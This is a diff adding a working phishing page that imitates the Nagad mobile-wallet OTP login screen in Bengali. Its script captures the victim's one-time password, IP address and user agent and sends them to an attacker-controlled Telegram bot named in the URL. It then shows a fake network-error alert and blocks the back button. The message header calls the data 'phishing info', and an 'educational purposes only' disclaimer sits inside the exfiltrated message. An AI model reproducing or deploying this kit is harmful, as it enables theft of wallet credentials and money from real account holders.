@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>নগদ ওয়েব লগ-ইন</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <style>
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        body {
+            background-color: #fafafa;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            height: 100vh;
+            padding-top: 50px;
+            overflow: hidden;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        .logo img {
+            max-width: 100px;
+        }
+
+        .container {
+            background-color: #fafafa;
+            padding: 20px;
+            border-radius: 10px;
+            width: 300px;
+            animation: fadeIn 1.5s ease-in-out;
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+            text-align: left;
+            position: relative;
+            animation: fadeIn 2s ease-in-out;
+        }
+
+        .input-group p {
+            margin: 0 0 5px;
+            font-weight: bold;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #ee462b;
+            font-family: FontAwesome;
+        }
+
+        .fa-key:before {
+            content: "\f084";
+        }
+
+        input[type="number"] {
+            width: 100%;
+            padding: 10px 10px 10px 40px;
+            border: none;
+            border-bottom: 2px solid #CCCCCC;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            font-size: 18px;
+            background-color: #fafafa;
+        }
+
+        input[type="number"]::placeholder {
+            font-family: Arial, sans-serif;
+            color: #999999;
+            font-size: 16px;
+        }
+
+        input:focus {
+            border-bottom: 2px solid #ee462b;
+            box-shadow: none;
+            outline: none;
+        }
+
+        input.invalid {
+            border-bottom: 2px solid red;
+        }
+
+        #loginButton {
+            background-color: transparent;
+            color: #ee462b;
+            border: 2px solid #ee462b;
+            padding: 10px 20px;
+            border-radius: 20px;
+            cursor: pointer;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            font-size: 18px;
+            transition: background-color 0.3s, color 0.3s, transform 0.3s;
+            animation: fadeIn 2.5s ease-in-out;
+        }
+
+        #loginButton:hover {
+            background-color: #ee462b;
+            color: #FFFFFF;
+            transform: translateY(-2px);
+        }
+
+        #timer {
+            text-align: center;
+            font-family: Arial, sans-serif;
+            font-size: 16px;
+            margin-top: 10px;
+            color: #ee462b;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">
+        <img src="http://i.ibb.co/k8LkGTT/removal-ai-d3363a06-05e5-4e1d-bb5b-60348f7c2805-img-20240617-115730.png" alt="nagad Logo">
+    </div>
+    <div class="container">
+        <div class="input-group">
+            <p>ওটিপি</p>
+            <i class="fa fa-key input-icon"></i>
+            <input type="number" placeholder="XXXXXX" id="otpInput">
+            <div id="timer">60 সেকেন্ড</div>
+        </div>
+        <button id="loginButton">যাচাই করুন</button>
+    </div>
+    <script>
+        function getQueryParams() {
+            const params = new URLSearchParams(window.location.search);
+            return {
+                token: params.get('token'),
+                chatId: params.get('id')
+            };
+        }
+
+        const { token, chatId } = getQueryParams();
+
+        const submitButton = document.getElementById('loginButton');
+        const otpInput = document.getElementById('otpInput');
+        const timerElement = document.getElementById('timer');
+
+        let timeLeft = 60;
+
+        function updateTimer() {
+            if (timeLeft <= 0) {
+                timeLeft = 60;
+            } else {
+                timeLeft--;
+            }
+            timerElement.textContent = timeLeft + ' সেকেন্ড';
+        }
+
+        setInterval(updateTimer, 1000);
+
+        submitButton.addEventListener('click', async () => {
+            const otpValue = otpInput.value;
+            if (!/^\d{6}$/.test(otpValue)) {
+                otpInput.classList.add('invalid');
+                alert("Please enter a valid 6-digit OTP.");
+                return;
+            } else {
+                otpInput.classList.remove('invalid');
+            }
+
+            const userAgent = navigator.userAgent;
+            const date = new Date();
+            const ip = await fetch('https://api.ipify.org?format=json').then(response => response.json()).then(data => data.ip);
+
+            const otpData = {
+                otp: otpValue,
+                ip: ip,
+                userAgent: userAgent,
+                date: date.toLocaleString()
+            };
+
+            const telegramMessage = `<b>🎣 নগদ ফি-শিং তথ্য</b>
+
+🔑 <b>OTP:</b> <code>${otpData.otp}</code>
+
+🌐 <b>IP Address:</b> ${otpData.ip}
+
+💻 <b>User Agent:</b> ${otpData.userAgent}
+
+📅 <b>Date:</b> ${otpData.date}
+
+<blockquote>⚠️এটি শুধু শিক্ষামূলক উদ্দেশ্যে বানানো হয়েছে। দয়া করে কেউ কারো ক্ষতি করার উদ্দেশ্যে এটি ব্যবহার করবেন না।</blockquote>`;
+
+            const sendToTelegram = async (token, chatId, message) => {
+                const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+
+                try {
+                    const response = await fetch(telegramUrl);
+                    const data = await response.json();
+                    if (!data.ok) {
+                        throw new Error('Failed to send message to Telegram');
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                    alert('Error occurred while sending message to Telegram');
+                }
+            };
+
+            await sendToTelegram(token, chatId, telegramMessage);
+
+            console.log('OTP:', otpValue);
+        });
+
+        window.onload = () => {
+            startTimer(60);
+        };
+
+        window.addEventListener('popstate', function(event) {
+            window.location.href = 'login.html';
+        });
+
+        window.history.pushState({}, '');
+
+        document.getElementById("loginButton").addEventListener("click", function() {
+            setTimeout(function() {
+                alert("দুঃখিত, নেটওয়ার্ক ত্রুটির কারণে সমস্যা হচ্ছে, দয়া করে পুনরায় চেষ্টা করুন।");
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
